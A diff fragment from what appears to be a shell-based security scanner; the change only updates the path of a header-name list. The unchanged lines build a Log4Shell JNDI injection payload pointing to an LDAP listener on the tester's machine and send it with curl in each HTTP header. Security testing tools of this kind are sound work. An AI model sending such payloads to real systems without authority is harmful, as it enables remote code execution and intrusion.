@@ -18,7 +18,7 @@ host=$1
 [ ! -z $host ] || raise_error "Host parameter Missing"
 host_ip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"
 
-sed 1d headers-large.txt | while IFS= read -r header
+sed 1d dast/headers-large.txt | while IFS= read -r header
 do
   malicious_packet="$header: \${jndi:ldap://$host_ip:1389/o=reference}"
   response=$(curl  -s -H "$malicious_packet" "$host")
